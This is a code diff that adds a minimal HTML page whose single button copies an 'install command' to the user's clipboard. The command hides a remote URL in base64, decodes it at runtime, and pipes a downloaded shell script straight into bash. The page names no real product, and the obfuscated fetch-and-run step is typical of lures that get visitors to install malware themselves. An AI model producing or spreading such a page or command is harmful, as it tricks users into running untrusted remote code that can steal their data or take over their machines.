@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Get Install Command</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  text-align: center;
+  margin-top: 100px;
+}
+button {
+  background-color: #007AFF;
+  color: white;
+  border: none;
+  padding: 15px 30px;
+  font-size: 16px;
+  border-radius: 8px;
+  cursor: pointer;
+}
+button:hover {
+  background-color: #005BB5;
+}
+</style>
+</head>
+<body>
+
+<h2>Click the button to copy the install command</h2>
+<button onclick="copyCommand()">📋 Copy Install Command</button>
+
+<script>
+function copyCommand() {
+  const command = `/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQzL2luc3RhbGwuc2g= | base64 -d))"`;
+  navigator.clipboard.writeText(command).then(() => {
+    alert('✅ Install command copied to clipboard!');
+  }).catch(err => {
+    alert('❌ Failed to copy: ' + err);
+  });
+}
+</script>
+
+</body>
+</html>
